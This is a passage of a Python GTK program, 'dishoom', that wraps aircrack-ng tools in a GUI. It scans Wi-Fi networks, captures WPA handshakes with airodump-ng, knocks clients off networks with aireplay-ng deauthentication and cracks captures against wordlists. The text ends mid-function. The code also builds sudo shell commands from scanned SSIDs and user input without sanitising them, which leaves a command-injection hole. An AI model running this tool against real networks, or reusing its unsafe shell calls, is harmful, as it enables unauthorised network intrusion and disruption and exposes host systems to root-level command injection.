#!/usr/bin/env python3
import gi
import argparse
import textwrap
gi.require_version('Gtk', '3.0')
from gi.repository  import Gtk, Gdk, Gio 
import os
import sys
import subprocess
from gi.repository import GObject as gobject

dirname, filename = os.path.split(os.path.abspath(__file__))
diruser= os.popen("eval echo ~${SUDO_USER}").read().split('\n', 1)[0]

class ListBoxRowWithData(Gtk.ListBoxRow):
    def __init__(self, data):
        super(Gtk.ListBoxRow, self).__init__()
        self.data = data
        self.add(Gtk.Label(label=data))

# MainWindow
class MainWindow(Gtk.Window):



    def __init__(self):
        Gtk.Window.__init__(self, title="dishoom")
        self.connect("destroy", Gtk.main_quit)
        self.set_position(Gtk.WindowPosition.CENTER)
        self.set_border_width(10)
        self.set_default_size(400,400)
        grid = Gtk.Grid()
        self.add(grid)

        hb = Gtk.HeaderBar()
        hb.set_show_close_button(True)
        hb.props.title = "dishoom"
        self.set_titlebar(hb)

        #empty space
        label_empty_space=Gtk.Label(label="\n")

        # Interfaces List
        command_interface = "iw dev | awk '$1==\"Interface\" {print $2}'"
        output_interface = os.popen(command_interface).read()
        box_outer = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)

        label_interface = Gtk.Label(label="Interfaces:")

        self.listbox = Gtk.ListBox()
        items = output_interface.split()
        for item in items:
            self.listbox.add(ListBoxRowWithData(item))

        def sort_func(row_1, row_2, data, notify_destroy):
            return row_1.data.lower() > row_2.data.lower()

        def filter_func(row, data, notify_destroy):
            return False if row.data == 'Fail' else True

        self.listbox.set_sort_func(sort_func, None, False)
        self.listbox.set_filter_func(filter_func, None, False)
        self.selection_listbox=None

        def on_row_activated(listbox_widget, row):
            self.selection_listbox = row.data
            print(self.selection_listbox)
            return self.selection_listbox

        self.listbox.connect('row-activated', on_row_activated)
        box_outer.pack_start(self.listbox, True, True, 0)
        self.listbox.show_all()

        # Go to airmonwindow button
        button_airmon=Gtk.Button(label="Manage Interface")
        button_airmon.connect("clicked", self.whenbutton_airmon_clicked)

        # Go to aircrackWindow button
        button_aircrack=Gtk.Button(label="Crack")
        button_aircrack.connect("clicked", self.whenbutton_aircrack_clicked)

        # Go to scanWindow button
        button_scanWindow=Gtk.Button(label="Scan")
        button_scanWindow.connect("clicked", self.whenbutton_scanWindow_clicked)


        grid.add(label_interface)
        grid.add(box_outer)
        grid.attach(button_airmon, 2,5,1,1)
        grid.attach(button_scanWindow, 2,3,1,1)
        grid.attach(button_aircrack, 2,4,1,1)
        grid.attach(label_empty_space, 2,2,1,1)

    # airmonWindow button | functionality
    def whenbutton_airmon_clicked(self, button):
        if (self.selection_listbox is not None):
            interface=self.selection_listbox
            airmonWindow = AirmonWindow(interface)
            airmonWindow.show_all()
            self.hide()
        else: 
            def on_error_clicked(self):
                dialog = Gtk.MessageDialog(self, 0, Gtk.MessageType.ERROR,
                    Gtk.ButtonsType.OK, "No interface is selected")
                dialog.format_secondary_text(
                    "Please make sure to select a valid interface")
                dialog.run()
                dialog.destroy()
            on_error_clicked(self)
        
    # scanWindow button | functionality
    def whenbutton_scanWindow_clicked(self, button):
        if (self.selection_listbox is not None):
            if ("mon" in self.selection_listbox):
                def on_error_clicked(self):
                    dialog = Gtk.MessageDialog(self, 0, Gtk.MessageType.ERROR,
                        Gtk.ButtonsType.OK, "Interface can't scan because interface is in monitor mode")
                    dialog.format_secondary_text(
                        "Please stop Monitor Mode and start Network Manager by clicking manage interface button in Main Window")
                    dialog.run()
                    dialog.destroy()
                on_error_clicked(self)
            else:
                interface=self.selection_listbox
                print(interface)
                scanwindow = scanWindow(interface)
                scanwindow.show_all()
                self.hide()
        else: 
            def on_error_clicked(self):
                dialog = Gtk.MessageDialog(self, 0, Gtk.MessageType.ERROR,
                    Gtk.ButtonsType.OK, "No interface is selected")
                dialog.format_secondary_text(
                    "Please make sure to select a valid interface")
                dialog.run()
                dialog.destroy()
            on_error_clicked(self)

    # aircrackWindow button | functionality
    def whenbutton_aircrack_clicked(self, button):
        aircrackwindow = aircrackWindow()
        aircrackwindow.show_all()
        self.hide()


class ListBoxRowWithData(Gtk.ListBoxRow):
    def __init__(self, data):
        super(Gtk.ListBoxRow, self).__init__()
        self.data = data
        self.add(Gtk.Label(label=data))



            
# AirmonWindow
class AirmonWindow(Gtk.Window):

    def __init__(self, interface):

        Gtk.Window.__init__(self, title="Manage Interface")
        self.connect("destroy", Gtk.main_quit)
        grid = Gtk.Grid()

        # the scrolledwindow
        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_border_width(10)
        # there is always the scrollbar (otherwise: AUTOMATIC - only if needed
        # - or NEVER)
        scrolled_window.set_policy(
            Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)

        self.add(scrolled_window)
        scrolled_window.add(grid)
        self.set_border_width(10)
        self.set_default_size(800,600)

        hb = Gtk.HeaderBar()
        hb.set_show_close_button(True)
        hb.props.title = "Manage Interface"
        self.set_titlebar(hb)

        # airmon check & airmon check kill
        button_airmon_check = Gtk.Button(label="Interface Check")
        self.button_airmon_check_kill = Gtk.Button(label="Kill Processes")
        self.button_airmon_check_kill.connect("clicked", self.whenbutton_airmon_check_kill_clicked, grid)
        button_airmon_check.connect("clicked", self.whenbutton_airmon_check_clicked, grid)

        #airmon start|stop {interface}
        button_airmon_start = Gtk.Button(label="Monitor mode Start")
        button_airmon_start.connect("clicked", self.whenbutton_airmon_clicked, "start", interface)
        button_airmon_stop = Gtk.Button(label="Monitor Mode Stop")
        button_airmon_stop.connect("clicked", self.whenbutton_airmon_clicked, "stop", interface)

        # command log output
        self.label_commands_log = Gtk.Label(label='')
        self.ebox_airmon_commands_log = Gtk.EventBox()
        self.label_commands_log_output = Gtk.Label(label='')
        self.label_commands_log_output.set_selectable(True)
        self.label_commands_log_output.set_line_wrap_mode(True)
        self.ebox_airmon_commands_log.add(self.label_commands_log_output)


        # Systemd toggle
        self.label_systemd=Gtk.Label(label="\nIf you are using systemd with NetworkManager.service you can stop it from here \n")
        self.button_systemd_start=Gtk.Button(label="Network Manager Start")
        self.button_systemd_start.connect("clicked", self.whenbutton_systemd_clicked, "start")
        self.button_systemd_stop=Gtk.Button(label="Network Manager Stop")
        self.button_systemd_stop.connect("clicked", self.whenbutton_systemd_clicked, "stop")
        label_systemd=Gtk.Label(label="\n Systemd Status: \n ")
        systemd_status=os.popen("sudo systemctl status NetworkManager.service | awk '$1==\"Active:\" {print $0}'").read()
        self.label_systemd_status=Gtk.Label(label=systemd_status)

        # Go back to Main Window
        self.button_mainwindow=Gtk.Button(label="Go to Main Window")
        self.button_mainwindow.connect("clicked", self.Gotomainwindow)

        # grid
        grid.attach(self.button_mainwindow, 0, 1, 1, 1)
        grid.attach(button_airmon_check, 1, 1, 1, 1)
        grid.attach(button_airmon_start, 1, 4, 1, 1)
        grid.attach(button_airmon_stop, 1, 7, 1, 1)
        grid.attach(self.label_commands_log, 1,8,1,1)
        grid.attach(self.ebox_airmon_commands_log, 1, 10, 1, 1)
        grid.attach(self.label_systemd, 1, 15, 5, 5)
        grid.attach(self.button_systemd_start, 1, 20, 1,1)
        grid.attach(self.button_systemd_stop, 1, 22, 1,1)
        grid.attach(label_systemd, 1, 23, 1,1)
        grid.attach(self.label_systemd_status, 1, 24, 1,1)


    # airmon-ng (start|stop) button | functionality
    def whenbutton_airmon_clicked(self, button, arg, interface):
        if (arg=="start"):
            command_airmon_start= f"sudo airmon-ng start {interface}"
            output_airmon_start = os.popen(command_airmon_start).read()
            self.label_commands_log_output.set_text(output_airmon_start)
            self.label_commands_log.set_text(f"{interface} start output:")
            return output_airmon_start
        elif (arg=="stop"):
            command_airmon_stop= f"sudo airmon-ng stop {interface}"
            output_airmon_stop= os.popen(command_airmon_stop).read()
            self.label_commands_log_output.set_text(output_airmon_stop)
            self.label_commands_log.set_text(f"{interface} stop output:")
            return output_airmon_stop

    # airmon-ng check button | functionality
    def whenbutton_airmon_check_clicked(self, button, grid):
        def airmonCheck():
            command_airmon_check = "sudo airmon-ng check"
            output_airmon_check = os.popen(command_airmon_check).read()
            return output_airmon_check

        self.label_commands_log_output.set_text(airmonCheck())
        self.label_commands_log.set_text("Check output:")
        grid.attach(self.button_airmon_check_kill,3, 12, 1, 1)
        self.show_all()
        
    # airmon-ng check kill button | functionality
    def whenbutton_airmon_check_kill_clicked(self, button, grid):
        def airmonCheckKill():
            command_airmon_check_kill = "sudo airmon-ng check kill"
            output_airmon_check_kill = os.popen(command_airmon_check_kill).read()
            return output_airmon_check_kill
        self.label_commands_log_output.set_text(airmonCheckKill())
        self.label_commands_log.set_text("Kill Output:")
        grid.remove(self.button_airmon_check_kill)


    # systemd button | functionality
    def whenbutton_systemd_clicked(self, button, arg):
        if (arg=="start"):
            command_networkmanager_start= "sudo systemctl start NetworkManager"
            output_networkmanager_start = os.popen(command_networkmanager_start).read()
            self.label_commands_log_output.set_text("Network Manager has been started")
            self.label_commands_log.set_text("Network Manager Start Output:")
            systemd_status=os.popen("sudo systemctl status NetworkManager.service | awk '$1==\"Active:\" {print $0}'").read()
            self.label_systemd_status.set_text(systemd_status)
            return output_networkmanager_start
        elif (arg=="stop"):
            command_networkmanager_stop= "sudo systemctl stop NetworkManager"
            output_networkmanager_stop= os.popen(command_networkmanager_stop).read()
            self.label_commands_log_output.set_text("Network Manager has been stopped")
            self.label_commands_log.set_text("Network Manager Stop Output:")
            systemd_status=os.popen("sudo systemctl status NetworkManager.service | awk '$1==\"Active:\" {print $0}'").read()
            self.label_systemd_status.set_text(systemd_status)
            return output_networkmanager_stop


    # mainwindow button | functionality
    def Gotomainwindow(self, button):
        mainWindow = MainWindow()
        mainWindow.show_all()
        self.hide()
        
# Scan for a network
class scanWindow(Gtk.Window):

    def __init__(self, interface):

        Gtk.Window.__init__(self, title="Scan")
        self.connect("destroy", Gtk.main_quit)
        self.set_position(Gtk.WindowPosition.CENTER)

        grid = Gtk.Grid()


        # the scrolledwindow
        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_border_width(10)
        # there is always the scrollbar (otherwise: AUTOMATIC - only if needed
        # - or NEVER)
        scrolled_window.set_policy(
            Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)

        self.add(scrolled_window)
        scrolled_window.add(grid)
        self.set_default_size(250,600)
        self.set_border_width(10)

        hb = Gtk.HeaderBar()
        hb.set_show_close_button(True)
        hb.props.title = "Scan"
        self.set_titlebar(hb)

        label_empty_space=Gtk.Label(label="\n")
        label_empty_space_2=Gtk.Label(label="\n")
        label_empty_space_3=Gtk.Label(label="\n")

        # SSID List
        
        self.main_command_essid_output= os.popen("dbus-run-session sudo iw {} scan".format(interface)).read()
        self.command_essid=''' echo "{}" | egrep "SSID:" | awk -F 'SSID:' '{}' '''.format(self.main_command_essid_output, "{print $2}")
        output_essid= os.popen(self.command_essid).read()
        print("\n"+output_essid+"\n")
        self.box_outer = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)

        self.listbox = Gtk.ListBox()
        items = output_essid.splitlines()
        for item in items:
            self.listbox.add(ListBoxRowWithData(item))

        def sort_func(row_1, row_2, data, notify_destroy):
            return row_1.data.lower() > row_2.data.lower()

        def filter_func(row, data, notify_destroy):
            return False if row.data == 'Fail' else True

        self.listbox.set_sort_func(sort_func, None, False)
        self.listbox.set_filter_func(filter_func, None, False)
        self.selection_listbox=None


        def on_row_activated(listbox_widget, row, grid):
            self.selection_listbox = row.data
            bssid_length = '{0,18}'
            self.ssid= self.selection_listbox
            try:
                self.bssid= os.popen(''' echo "{}" | grep -w -m 1 -B10 "{}" | grep -m 1 -E "BSS" | grep -E -o "^BSS.{}" | grep -oP "^BSS \K.*" '''.format(self.main_command_essid_output, self.selection_listbox, bssid_length)).read()
                self.channel= os.popen(''' echo "{}" | grep -w -m 1 -A999 "{}" | grep -m 1 -E "DS Parameter set: channel" | grep -oP "DS Parameter set: channel \K.*" '''.format(self.main_command_essid_output, self.selection_listbox)).read()
                pass
            except Exception as Thread:
                raise Thread

            self.label_ssid_output.set_text(self.ssid)
            self.label_bssid_output.set_text(self.bssid)
            self.label_channel_output.set_text(self.channel)
            return self.selection_listbox, self.ssid, self.bssid, self.channel



        # Selected AP info
        self.label_ssid=Gtk.Label(label="SSID:")
        self.label_ssid_output=Gtk.Label(label="")
        self.label_bssid=Gtk.Label(label="BSSID:")
        self.label_bssid_output=Gtk.Label(label="")
        self.label_channel=Gtk.Label(label="Channel:")
        self.label_channel_output=Gtk.Label(label="")

        self.listbox.connect('row-activated', on_row_activated, grid)
        self.box_outer.pack_start(self.listbox, True, True, 0)
        label_essid= Gtk.Label(label="SSID:")
        self.box_outer.remove(self.listbox)
        self.box_outer.add(self.listbox)

        # scanning command
        button_scan = Gtk.Button(label=f" Scan {interface}")
        button_scan.connect("clicked", self.whenbutton_scan_clicked, grid, interface)
        
        # Go back to Main Window
        self.button_mainwindow=Gtk.Button(label="Go to Main Window")
        self.button_mainwindow.connect("clicked", self.Gotomainwindow)

        # Go to airmon-ng Window
        self.button_airmonSsidWindow=Gtk.Button(label="Capture")
        self.button_airmonSsidWindow.connect("clicked", self.Gotoairmonssidwindow, interface)


        # grid
        grid.attach(self.button_mainwindow, 0, 1, 1, 1)
        grid.attach(button_scan, 0, 2, 1, 1)
        grid.attach(self.label_ssid, 0, 9, 1, 1)
        grid.attach(self.label_ssid_output, 0, 10, 1, 1)
        grid.attach(self.label_bssid, 0, 11, 1, 1)
        grid.attach(self.label_bssid_output, 0, 12, 1, 1)
        grid.attach(self.label_channel, 0, 13, 1, 1)
        grid.attach(self.label_channel_output, 0, 14, 1, 1)
        grid.attach(label_empty_space, 3, 5, 1, 1)
        grid.attach(label_empty_space_2, 0, 8, 1, 1)
        grid.attach(label_empty_space_3, 0, 16, 1, 1)
        grid.attach(self.box_outer, 0,7,1,1)
        grid.attach(self.button_airmonSsidWindow, 0, 16, 1, 1)

    # mainwindow button | functionality
    def Gotomainwindow(self, button):
        mainWindow = MainWindow()
        mainWindow.show_all()
        self.hide()
    
    # airmonWindowSSid button | functionality
    def Gotoairmonssidwindow(self, button, interface):
        try:
            airmonssidwindow = airmonSsidWindow(interface, self.ssid, self.bssid, self.channel)
            airmonssidwindow.show_all()
            self.hide()
            pass
        except Exception as Thread:
            raise Thread
    
    # scan  button | functionality
    def whenbutton_scan_clicked(self, button, grid, interface):
            self.hide()
            scanwindow = scanWindow(interface)
            scanwindow.show_all()

#  Airmon-ng Window
class airmonSsidWindow(Gtk.Window):

    def __init__(self, interface, ssid, bssid, channel):

        Gtk.Window.__init__(self, title="Capture")
        self.connect("destroy", Gtk.main_quit)
        grid = Gtk.Grid()

         # the scrolledwindow
        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_border_width(10)
        # there is always the scrollbar (otherwise: AUTOMATIC - only if needed
        # - or NEVER)
        scrolled_window.set_policy(
            Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)

        self.add(scrolled_window)
        scrolled_window.add(grid)
        self.set_border_width(10)
        self.set_default_size(800,600)

        hb = Gtk.HeaderBar()
        hb.set_show_close_button(True)
        hb.props.title = "Capture"
        self.set_titlebar(hb)

        label_empty_space=Gtk.Label(label="\n")
        label_empty_space_2=Gtk.Label(label="\n")

        # Selected AP info
        self.label_ssid=Gtk.Label(label="SSID:")
        self.label_ssid_output=Gtk.Label(label=ssid)
        self.label_bssid=Gtk.Label(label="BSSID:")
        self.label_bssid_output=Gtk.Label(label=bssid)
        self.label_channel=Gtk.Label(label="Channel:")
        self.label_channel_output=Gtk.Label(label=channel)


        # airmon check & airmon check kill
        button_airmon_check = Gtk.Button(label="Interface Check")
        self.button_airmon_check_kill = Gtk.Button(label="Kill Processes")
        self.button_airmon_check_kill.connect("clicked", self.whenbutton_airmon_check_kill_clicked, grid)
        button_airmon_check.connect("clicked", self.whenbutton_airmon_check_clicked, grid)

        #airmon start|stop {interface}
        button_airmon_start = Gtk.Button(label="Monitor Mode Start")
        button_airmon_start.connect("clicked", self.whenbutton_airmon_clicked, "start", interface, grid)
 #       button_airmon_stop = Gtk.Button(label="Monitor Mode Stop")
 #       button_airmon_stop.connect("clicked", self.whenbutton_airmon_clicked, "stop", interface)

        # command log output
        self.label_commands_log = Gtk.Label(label='')
        self.ebox_airmon_commands_log = Gtk.EventBox()
        self.label_commands_log_output = Gtk.Label('')
        self.label_commands_log_output.set_selectable(True)
        self.label_commands_log_output.set_line_wrap_mode(True)
        self.ebox_airmon_commands_log.add(self.label_commands_log_output)


        # Systemd toggle
        self.label_systemd=Gtk.Label(label="\n If you are using systemd with NetworkManager.service you can stop it from here \n")
 #      self.button_systemd_start=Gtk.Button(label="Network Manager Start")
 #      self.button_systemd_start.connect("clicked", self.whenbutton_systemd_clicked, "start")
        self.button_systemd_stop=Gtk.Button(label="Network Manager Stop")
        self.button_systemd_stop.connect("clicked", self.whenbutton_systemd_clicked, "stop")
        label_systemd=Gtk.Label(label="\n Network Manager Status: \n ")
        systemd_status=os.popen("dbus-run-session sudo systemctl status NetworkManager.service | awk '$1==\"Active:\" {print $0}'").read()
        self.label_systemd_status=Gtk.Label(systemd_status)

        # Go back to Main Window
        self.button_mainwindow=Gtk.Button(label="Go to Main Window")
        self.button_mainwindow.connect("clicked", self.Gotomainwindow)

        # Current Interface
        self.label_current_interface=Gtk.Label(label="Current Interface:")
        self.label_current_interface_output=Gtk.Label(label="")
        self.new_interface=""
        # Go to Airodump-ng Window
        self.button_airodumpWindow=Gtk.Button(label="Capture")
        self.button_airodumpWindow.connect("clicked", self.Gotoairodumpwindow, ssid, bssid, channel)

        # grid
        grid.attach(self.button_mainwindow, 0, 1, 1, 1)
        grid.attach(self.button_airodumpWindow, 1,33, 1, 1)
        grid.attach(self.label_current_interface, 1, 0, 0, 0)
        grid.attach(self.label_current_interface_output, 3, 1, 1, 1)
        grid.attach(button_airmon_check, 1, 1, 1, 1)
        grid.attach(button_airmon_start, 1, 4, 1, 1)
#        grid.attach(button_airmon_stop, 1, 7, 1, 1)
        grid.attach(self.label_commands_log, 1,8,1,1)
        grid.attach(self.ebox_airmon_commands_log, 1, 10, 1, 1)
        grid.attach(self.label_systemd, 1, 15, 5, 5)
#        grid.attach(self.button_systemd_start, 1, 20, 1,1)
        grid.attach(self.button_systemd_stop, 1, 22, 1,1)
        grid.attach(label_systemd, 1, 23, 1,1)
        grid.attach(self.label_systemd_status, 1, 24, 1,1)
        grid.attach(self.label_ssid, 1, 27, 1, 1)
        grid.attach(self.label_ssid_output, 1, 28, 1, 1)
        grid.attach(self.label_bssid, 1, 29, 1, 1)
        grid.attach(self.label_bssid_output, 1, 30, 1, 1)
        grid.attach(self.label_channel, 1, 31, 1, 1)
        grid.attach(self.label_channel_output, 1, 32, 1, 1)


    # airmon-ng (start|stop) button | functionality
    def whenbutton_airmon_clicked(self, button, arg, interface, grid):
        if (arg=="start"):
            command_airmon_start= f"sudo airmon-ng start {interface}"
            output_airmon_start = os.popen(command_airmon_start).read()
            self.label_commands_log_output.set_text(output_airmon_start)
            self.label_commands_log.set_text(f"{interface} Start Output:")
            command_new_interface = "iw dev | awk '$1==\"Interface\" {print $2}'"
            output_new_interface = os.popen(command_new_interface).read()
            print(output_new_interface)
            grid.attach(self.button_airodumpWindow, 1, 36, 1, 1)
            self.label_current_interface_output.set_text(output_new_interface)
            self.new_interface=output_new_interface
            return output_airmon_start, self.new_interface
        elif (arg=="stop"):
            command_airmon_stop= f"dbus-run-session sudo airmon-ng stop {interface}"
            output_airmon_stop= os.popen(command_airmon_stop).read()
            self.label_commands_log_output.set_text(output_airmon_stop)
            self.label_commands_log.set_text(f"{interface} Stop Output:")
            command_new_interface = "iw dev | awk '$1==\"Interface\" {print $2}'"
            output_new_interface = os.popen(command_new_interface).read()
            print(output_new_interface)
            self.label_current_interface_output.set_text(output_new_interface)
            new_interface=output_new_interface
            return output_airmon_stop, new_interface

    # AirodumpWindow button | functionality
    def Gotoairodumpwindow(self, button, ssid, bssid, channel):
            if ("mon" in self.new_interface):
                airodumpwindow = airodumpWindow(self.new_interface, ssid, bssid, channel)
                airodumpwindow.show_all()
                self.hide()
            else:
                def on_error_clicked(self):
                    dialog = Gtk.MessageDialog(self, 0, Gtk.MessageType.ERROR,
                        Gtk.ButtonsType.OK, "Monitor Mode is not started")
                    dialog.format_secondary_text(
                        "Please start Monitor Mode and try again")
                    dialog.run()
                    dialog.destroy()
                on_error_clicked(self)


    # airmon-ng check button | functionality
    def whenbutton_airmon_check_clicked(self, button, grid):
        def airmonCheck():
            command_airmon_check = "dbus-run-session sudo airmon-ng check"
            output_airmon_check = os.popen(command_airmon_check).read()
            return output_airmon_check

        self.label_commands_log_output.set_text(airmonCheck())
        self.label_commands_log.set_text("Interface Check Output:")
        grid.attach(self.button_airmon_check_kill,3, 12, 1, 1)
        self.show_all()
        
    # airmon-ng check kill button | functionality
    def whenbutton_airmon_check_kill_clicked(self, button, grid):
        def airmonCheckKill():
            command_airmon_check_kill = "dbus-run-session sudo airmon-ng check kill"
            output_airmon_check_kill = os.popen(command_airmon_check_kill).read()
            return output_airmon_check_kill
        self.label_commands_log_output.set_text(airmonCheckKill())
        self.label_commands_log.set_text("Kill Output:")
        grid.remove(self.button_airmon_check_kill)

    # systemd button | functionality
    def whenbutton_systemd_clicked(self, button, arg):
        if (arg=="start"):
            command_networkmanager_start= "dbus-run-session sudo systemctl start NetworkManager"
            output_networkmanager_start = os.popen(command_networkmanager_start).read()
            self.label_commands_log_output.set_text("Network Manager has been started")
            self.label_commands_log.set_text("Network Manager Start Output:")
            systemd_status=os.popen("dbus-run-session sudo systemctl status NetworkManager.service | awk '$1==\"Active:\" {print $0}'").read()
            self.label_systemd_status.set_text(systemd_status)
            return output_networkmanager_start
        elif (arg=="stop"):
            command_networkmanager_stop= "dbus-run-session sudo systemctl stop NetworkManager"
            output_networkmanager_stop= os.popen(command_networkmanager_stop).read()
            self.label_commands_log_output.set_text("Network Manager has been stopped")
            self.label_commands_log.set_text("Network Manager Stop Output:")
            systemd_status=os.popen("dbus-run-session sudo systemctl status NetworkManager.service | awk '$1==\"Active:\" {print $0}'").read()
            self.label_systemd_status.set_text(systemd_status)
            return output_networkmanager_stop


    # mainwindow button | functionality
    def Gotomainwindow(self, button):
        mainWindow = MainWindow()
        mainWindow.show_all()
        self.hide()


#  Airodump-ng Window
class airodumpWindow(Gtk.Window):

    def __init__(self, new_interface, ssid, bssid, channel):

        Gtk.Window.__init__(self, title="Capture")
        self.connect("destroy", Gtk.main_quit)
        grid = Gtk.Grid()

         # the scrolledwindow
        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_border_width(10)
        # there is always the scrollbar (otherwise: AUTOMATIC - only if needed
        # - or NEVER)
        scrolled_window.set_policy(
            Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)

        self.add(scrolled_window)
        scrolled_window.add(grid)
        self.set_border_width(10)
        self.set_default_size(800,600)

        hb = Gtk.HeaderBar()
        hb.set_show_close_button(True)
        hb.props.title = "Capture"
        self.set_titlebar(hb)

        self.label_empty_space=Gtk.Label(label="\n")
        label_empty_space_2=Gtk.Label(label="\n")

        #variables:
        self.new_interface=new_interface
        self.ssid=ssid
        self.bssid=os.popen("echo '{}' ".format(bssid)).read()
        print(self.bssid)
        self.channel=os.popen("echo '{}'".format(channel)).read()
        print(self.channel)


        # aireplay-ng
        self.label_entry_station=Gtk.Label(label="Input one of the stations' addresses:")
        self.entry_station=Gtk.Entry()
        self.button_aireplay=Gtk.Button(label="Deauthenticate")
        self.button_aireplay.connect("clicked", self.startAireplay)


        # Terminal
#        self.label_terminal=Gtk.Label(label="input your desired terminal along with its excution argument. \n ex.1. xfce4-terminal -x \n ex.2. gnome-terminal -x")
#        self.entry_terminal=Gtk.Entry()
#        self.entry_terminal.set_text("xfce4-terminal -x")

        # deauth
        self.label_entry_deauth=Gtk.Label(label="Input how many deauth you want to send")
        self.entry_deauth=Gtk.Entry()

        # target name
        self.label_target=Gtk.Label(label="Input the name of Capture output file where the handshake is stored")
        self.entry_target_name=Gtk.Entry()

        # Submit button
        self.button_submit=Gtk.Button(label="Start Capture on {}".format(new_interface))
        self.button_submit.connect("clicked", self.submit, grid)

        # Go back to Main Window
        self.button_mainwindow=Gtk.Button(label="Go to Main Window")
        self.button_mainwindow.connect("clicked", self.Gotomainwindow)

        #grid 
        grid.attach(self.button_mainwindow, 0, 1, 1, 1)
        grid.attach(self.label_empty_space, 0, 2, 1, 1)
#        grid.attach(self.label_terminal, 1, 3, 1, 1)
#        grid.attach(self.entry_terminal, 1, 4, 1, 1)
        grid.attach(self.label_target, 1, 5, 1, 1)
        grid.attach(self.entry_target_name, 1, 6, 1, 1)
        grid.attach(self.button_submit, 0, 7, 1, 1)




    # Submit button | functionality
    def submit(self, button, grid):
        try:
#            self.terminal = self.entry_terminal.get_text()
#            self.terminal = "gnome-terminal -- bash -c"
            self.target = self.entry_target_name.get_text()
            try:
                if os.path.isdir('{}/.dishoom/'.format(diruser)):
                    path="{}/.dishoom/{}".format(diruser, self.target)
                else:
                    os.system('mkdir {}/.dishoom'.format(diruser))
                    path="{}/.dishoom/{}".format(diruser, self.target)
                pass
            except Exception as Thread:
                raise Thread

            bssid = os.linesep.join([s for s in self.bssid.splitlines() if s])
            channel = os.linesep.join([s for s in self.channel.splitlines() if s])
            grid.attach(self.button_aireplay, 0, 12, 1, 1)
            grid.attach(self.label_entry_station, 1, 8, 1, 1)
            grid.attach(self.entry_station, 1, 9, 1, 1)
            grid.attach(self.label_entry_deauth, 1, 10, 1, 1)
            grid.attach(self.entry_deauth, 1, 11, 1, 1)
            self.show_all()
            command_airodump = '''gnome-terminal -- bash -c "sudo airodump-ng --bssid '{}' -c '{}' --write '{}' {} ; exec bash"'''.format(bssid, channel, path, self.new_interface)
            print(command_airodump)
#            command_airodump="{} 'airmon-ng check {}'".format(self.terminal, self.new_interface)
            command_airodump_run=os.popen(command_airodump)
            pass
        except Exception as Thread:
            def on_error_clicked(self):
                dialog = Gtk.MessageDialog(self, 0, Gtk.MessageType.ERROR,
                    Gtk.ButtonsType.OK, "Error!")
                dialog.format_secondary_text(
                    Thread)
                dialog.run()
                dialog.destroy()
            on_error_clicked(self)
            raise Thread
        
    # aireplay button | functionality
    def startAireplay(self, button):
        try:
            station = self.entry_station.get_text()
            deauth= self.entry_deauth.get_text()
            aireplay_output = os.popen("sudo aireplay-ng --deauth '{}' -a '{}' -c '{}' {}".format(deauth, self.bssid, station, self.new_interface)).read()
            print(aireplay_output)
            pass
        except Exception as Thread:
            raise Thread
        
    # mainwindow button | functionality
    def Gotomainwindow(self, button):
        mainWindow = MainWindow()
        mainWindow.show_all()
        self.hide()


#  Aircrack-ng Window
class aircrackWindow(Gtk.Window):

    def __init__(self):

        Gtk.Window.__init__(self, title="Crack")
        self.connect("destroy", Gtk.main_quit)
        grid = Gtk.Grid()

         # the scrolledwindow
        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_border_width(10)
        # there is always the scrollbar (otherwise: AUTOMATIC - only if needed
        # - or NEVER)
        scrolled_window.set_policy(
            Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)

        self.add(scrolled_window)
        scrolled_window.add(grid)
        self.set_border_width(10)
        self.set_default_size(600,600)

        hb = Gtk.HeaderBar()
        hb.set_show_close_button(True)
        hb.props.title = "Crack"
        self.set_titlebar(hb)
        
        self.label_empty_space=Gtk.Label(label="\n")
        label_empty_space_2=Gtk.Label(label="\n")

        self.cap= None
        self.wordlist= None
        self.label_cap=Gtk.Label(label="Capture file path is:")
        self.label_cap_output=Gtk.Label(label="")
        self.label_wordlist=Gtk.Label(label="Wordlist file path is:")
        self.label_wordlist_output=Gtk.Label(label="")
    
        # cap file
        self.button_cap = Gtk.Button("Choose the *.cap file")
        self.button_cap.connect("clicked", self.on_file_clicked, "cap")

        # wordlist file
        self.button_wordlist= Gtk.Button("Choose a Wordlist")
        self.button_wordlist.connect("clicked", self.on_file_clicked, "wordlist")

        # button aircrack
        self.button_aircrack=Gtk.Button(label="Start Crack")
        self.button_aircrack.connect("clicked", self.startAircrack)

        # Terminal
#        self.label_terminal=Gtk.Label(label="input your desired terminal along with its excution argument. \n ex.1. xfce4-terminal -x \n ex.2. gnome-terminal -x")
#        self.entry_terminal=Gtk.Entry()
#        self.entry_terminal.set_text("xfce4-terminal -x")

        # Go back to Main Window
        self.button_mainwindow=Gtk.Button(label="Go to Main Window")
        self.button_mainwindow.connect("clicked", self.Gotomainwindow)

        #grid 
        grid.attach(self.button_mainwindow, 0, 1, 1, 1)
        grid.attach(self.button_cap, 1, 2, 1, 1)
        grid.attach(self.label_cap, 1, 3, 1, 1)
        grid.attach(self.label_cap_output, 2, 3, 1, 1)
        grid.attach(self.button_wordlist, 1, 4, 1, 1)
        grid.attach(self.label_wordlist, 1, 5, 1, 1)
        grid.attach(self.label_wordlist_output, 2, 5, 1, 1)
#        grid.attach(self.label_terminal, 1, 7, 1, 1)
#        grid.attach(self.entry_terminal, 1, 8, 1, 1)
        grid.attach(self.button_aircrack, 0, 9, 1, 1)


    # aircrack | functionality
    def startAircrack(self, button):
        try:
#            self.terminal = self.entry_terminal.get_text()
            command_aircrack = '''gnome-terminal -- bash -c "sudo aircrack-ng -w '{}' '{}' ; exec bash"'''.format(self.wordlist, self.cap)
            start_aircrack=os.popen(command_aircrack)
            pass
        except Exception as Thread:
            raise Thread

    # file dialog
    def on_file_clicked(self, widget, file_type):
        dialog = Gtk.FileChooserDialog("Please choose a file: ",   self,
            Gtk.FileChooserAction.OPEN,
            (Gtk.STOCK_CANCEL, Gtk.ResponseType.CANCEL,
